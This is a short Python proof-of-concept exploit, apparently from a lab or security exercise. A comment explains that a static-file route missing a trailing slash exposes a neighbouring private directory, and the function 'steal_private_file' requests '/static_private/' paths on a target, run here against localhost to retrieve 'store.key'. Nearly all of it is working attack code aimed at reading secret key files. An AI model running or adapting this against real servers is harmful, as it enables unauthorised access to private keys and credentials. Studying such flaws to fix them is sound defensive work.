### Private files can be leaked due to insecure static file handling. The static
### directory is missing a trailing slash and due to unfortunate naming, the
### private directory can be accessed.
import requests

def steal_private_file(target, fname):
    r = requests.get(f'{target}/static_private/{fname}')
    if r.status_code != 200:
        print('Something wrong with target server')
        return
    return r.content

TARGET = 'http://localhost:7777' # for example
print(steal_private_file(TARGET, 'store.key'))
